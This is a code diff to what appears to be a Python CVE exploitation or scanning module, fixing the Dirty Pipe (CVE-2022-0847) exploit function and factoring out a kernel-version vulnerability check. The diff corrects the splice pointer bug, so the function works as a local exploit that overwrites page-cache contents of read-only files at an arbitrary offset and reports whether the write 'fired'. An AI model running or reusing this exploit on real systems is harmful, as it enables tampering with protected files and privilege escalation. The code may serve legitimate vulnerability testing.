@@ -130,6 +130,16 @@ def check_boothole(ip=None, params=None):
 # CVE-2022-0847 Dirty Pipe — inline splice attack (Linux only)
 # ---------------------------------------------------------------------------
 
+def _dirtypipe_kernel_vulnerable():
+    """True when the running kernel is inside the CVE-2022-0847 range
+    (5.8 .. 5.16.10, minus the backported fixes)."""
+    maj, minr, patch = _kernel_release()
+    return (5, 8) <= (maj, minr) <= (5, 16) and not (
+        (maj, minr, patch) >= (5, 16, 11)
+        or (maj, minr) == (5, 15) and (maj, minr, patch) >= (5, 15, 25)
+        or (maj, minr) == (5, 10) and (maj, minr, patch) >= (5, 10, 102))
+
+
 def exploit_dirtypipe(path, offset=0, data=b"quantum\n"):
     if not sys.platform.startswith("linux"):
         return {"cve": "CVE-2022-0847", "status": "linux-only",
@@ -143,19 +153,26 @@ def exploit_dirtypipe(path, offset=0, data=b"quantum\n"):
             os.write(w, b"x")
             os.read(r, 1)
         fd = os.open(path, os.O_RDONLY)
-        # splice exactly 1 byte from (offset-1) into the pipe
+        # splice exactly 1 byte from (offset-1) into the pipe.
+        # off_in is loff_t* — pass a real pointer (byref), not a value,
+        # or the kernel EFAULTs the copy_from_user and splice returns -1.
         SPLICE_F_MOVE = 1
-        n = libc.splice(fd, ctypes.c_int64(offset - 1), w, None, 1, SPLICE_F_MOVE)
+        off = ctypes.c_int64(offset - 1)
+        n = libc.splice(fd, ctypes.byref(off), w, None, 1, SPLICE_F_MOVE)
         if n != 1:
+            err = ctypes.get_errno()
             os.close(fd); os.close(r); os.close(w)
-            return {"cve": "CVE-2022-0847", "status": "splice-fail", "n": n}
-        os.write(w, data)  # overwrites page-cache from `offset`
+            return {"cve": "CVE-2022-0847", "status": "splice-fail", "n": n,
+                    "errno": err}
+        os.write(w, data)  # merges into the page cache on vulnerable kernels
         os.close(fd); os.close(r); os.close(w)
         with open(path, "rb") as fh:
             fh.seek(offset)
             check = fh.read(len(data))
         return {"cve": "CVE-2022-0847", "status": "fired",
-                "verified": check == data, "path": path, "offset": offset}
+                "verified": check == data, "path": path, "offset": offset,
+                "kernel": "%d.%d.%d" % _kernel_release(),
+                "kernel_fixed": not _dirtypipe_kernel_vulnerable()}
     except Exception as exc:
         return {"cve": "CVE-2022-0847", "status": "error", "error": str(exc)}
 
@@ -165,10 +182,7 @@ def v3_dirtypipe(ip=None, params=None):
     params = params or {}
     maj, minr, patch = _kernel_release()
     if sys.platform.startswith("linux"):
-        vulnerable = (5, 8) <= (maj, minr) <= (5, 16) and not (
-            (maj, minr, patch) >= (5, 16, 11)
-            or (maj, minr, patch) >= (5, 15, 25) and (maj, minr) == (5, 15)
-            or (maj, minr, patch) >= (5, 10, 102) and (maj, minr) == (5, 10))
+        vulnerable = _dirtypipe_kernel_vulnerable()
     else:
         vulnerable = False
     if vulnerable and params.get("file"):
